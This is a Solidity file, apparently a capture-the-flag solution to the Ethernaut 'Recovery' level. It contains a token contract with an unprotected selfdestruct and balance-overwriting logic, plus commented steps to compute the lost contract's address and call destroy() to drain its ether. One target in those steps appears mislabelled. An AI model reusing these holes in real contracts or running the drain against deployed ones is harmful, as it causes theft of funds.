// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    using SafeMath for uint256;
    // public variables
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(
        string memory _name,
        address _creator,
        uint256 _initialSupply
    ) public {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value.mul(10);
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

///// HOW TO FIND ANY SMART CONTRACTS 'LOST' ADDRESS /////
// CALCULATING IT //
/* 
            // SOLIDITY DOCS
            The address of an external account is determined from the public key while the address of a contract is determined 
            at the time the contract is created (it is derived from the creator address and the number of transactions sent from that 
            address, the so-called “nonce”). 

            // ETHEREUM YELLOW PAPER
            The address of the new account is defined as being the rightmost 160 bits of the Keccak-256 hash of the RLP
            encoding of the structure containing only the sender and the account nonce

            //NOTE
            Above: contract Recovery{} is the factory contract and created contract SimpleToken{}.

            //FORMULA
            address = rightmost_20_bytes(keccak(RLP(sender address, nonce)));

                ///// RLP /////
                web3.utils.soliditySha3(RLP Info "0xd6", RLP Indo "0x94", Smart Contract Address "0xcc8E8c5DFA9B741b9B64BC695BD3812Ef68a4c11", nonce "0x01")
                This will return a hex of - '0x76c5ce237c034a568d85a599b63ff2e1e829a5271086375be2fd281bfdb24725'
                The right most 40 digits will be the right most 20 bytes which is our 'lost' contract address. = b63ff2e1e829a5271086375be2fd281bfdb24725
        */

// EHTERSCAN //
/*
            Simply search the Recovery address in Etherscan and locate your token from it's 'contract creations'
        */

// FORMULA TO CALL THE SELF DESTRUCT FUNCTION ON OUR 'lost' CONTRACT //
/* 
            data = web3.eth.abi.encodeFunctionCall({
                name: 'destroy',
                type: 'function',
                inputs: [{
                    type: 'address',
                    name: '_to'
                }]
            }, [player]);

            This gives us - '0x00f55d9d0000000000000000000000002ab05351520d3e0e7e7509bc96bbc94970bc0323'

            THEN...

            await web3.eth.sendTransaction({
                to: Recovery Smart Contract,
                from: player,
                data: data
            })
        */
